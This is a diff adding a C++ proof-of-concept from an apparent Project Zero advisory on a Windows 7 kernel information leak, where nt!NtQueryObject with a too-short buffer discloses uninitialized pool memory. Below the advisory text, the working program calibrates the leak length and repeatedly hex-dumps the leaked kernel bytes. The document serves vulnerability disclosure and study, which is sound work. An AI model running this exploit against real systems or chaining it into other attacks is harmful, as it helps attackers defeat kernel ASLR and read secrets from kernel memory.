@@ -1,0 +1,123 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1303&desc=2
+
+We have discovered that the nt!NtQueryObject syscall handler discloses portions of uninitialized pool memory to user-mode clients when the following conditions are met:
+
+ a) It is invoked with the ObjectNameInformation information class and a file object associated with a file on local disk (other configurations were not tested).
+ b) The provided buffer is too short to contain even the first part of the output data, i.e. the name of the harddisk volume device (e.g. "\Device\HarddiskVolume2").
+
+By empirically testing the system call in the above set up, we have found that it actually behaves in five different ways depending on the length of the output buffer:
+
+ a) From 1 to 7 (32-bit) or 15 (64-bit): no output, syscall returns STATUS_INFO_LENGTH_MISMATCH.
+ b) From 8/16 to N-1 (N being size required to store the name of the volume device): uninitialized pool memory is disclosed to user-mode, syscall returns STATUS_BUFFER_OVERFLOW.
+ c) From N to N+1: partial path is copied to user-mode, syscall returns STATUS_OBJECT_PATH_INVALID.
+ d) From N+2 to M-1 (M being the size required to store the entire output data): partial path is copied to user-mode, syscall returns STATUS_BUFFER_OVERFLOW.
+ e) From M to ...: full path is copied to user-mode, syscall returns STATUS_SUCCESS.
+
+The issue is of course with case (b); it means that between 1 and about 56 bytes of uninitialized kernel pool memory can be leaked with a single nt!NtQueryObject call.
+
+The attached proof of concept program has been tested on 32 and 64-bit builds of Windows 7. It dumps the data leaked by the affected syscall in each subsequent iteration, and then waits for user interaction (ENTER key press) before executing the next one. When the Special Pools mechanism is enabled for ntoskrnl.exe, the PoC output should be similar to the following:
+
+--- cut ---
+00000000: e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 ................
+00000010: e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 ................
+00000020: e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 ................
+00000030: e1 e1 e1 e1 e1 e1 e1 ?? ?? ?? ?? ?? ?? ?? ?? ?? ................
+
+00000000: 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 ################
+00000010: 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 ################
+00000020: 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 ################
+00000030: 23 23 23 23 23 23 23 ?? ?? ?? ?? ?? ?? ?? ?? ?? #######.........
+
+00000000: 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d ----------------
+00000010: 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d ----------------
+00000020: 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d ----------------
+00000030: 2d 2d 2d 2d 2d 2d 2d ?? ?? ?? ?? ?? ?? ?? ?? ?? -------.........
+
+00000000: 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 7777777777777777
+00000010: 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 7777777777777777
+00000020: 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 7777777777777777
+00000030: 37 37 37 37 37 37 37 ?? ?? ?? ?? ?? ?? ?? ?? ?? 7777777.........
+--- cut ---
+
+A different repeated marker byte (inserted by Special Pools upon allocation) is displayed each time, which means that uninitialized data from new pool allocations is disclosed to the user-mode client in each attempt.
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+#include <ntstatus.h>
+#include <cstdio>
+
+#define ObjectNameInformation ((OBJECT_INFORMATION_CLASS)1)
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  BOOL wow64 = FALSE;
+  if (!IsWow64Process(GetCurrentProcess(), &wow64) || wow64) {
+    printf("The program has to be built for the native architecture of your OS (x86 or x64).\n");
+    return 1;
+  }
+
+  HANDLE hFile = CreateFile(L"C:\\Windows\\system32\\svchost.exe", FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+  if (hFile == INVALID_HANDLE_VALUE) {
+    printf("CreateFile failed, %d\n", GetLastError());
+    return 1;
+  }
+
+  BYTE OutputBuffer[0x100];
+  ULONG ReturnLength;
+  ULONG MaximumLeakLength;
+
+  for (MaximumLeakLength = 0; MaximumLeakLength < sizeof(OutputBuffer); MaximumLeakLength++) {
+    NTSTATUS st = NtQueryObject(hFile, ObjectNameInformation, OutputBuffer, MaximumLeakLength, &ReturnLength);
+    if (st == STATUS_OBJECT_PATH_INVALID) {
+      MaximumLeakLength--;
+      break;
+    }
+  }
+
+  while (1) {
+    RtlZeroMemory(OutputBuffer, sizeof(OutputBuffer));
+
+    NTSTATUS st = NtQueryObject(hFile, ObjectNameInformation, OutputBuffer, MaximumLeakLength, &ReturnLength);
+    if (st != STATUS_BUFFER_OVERFLOW) {
+      printf("NtQueryObject failed, %x\n", st);
+      CloseHandle(hFile);
+      return 1;
+    }
+
+    PrintHex(OutputBuffer, MaximumLeakLength);
+
+    getchar();
+  }
+
+  CloseHandle(hFile);
+  return 0;
+}
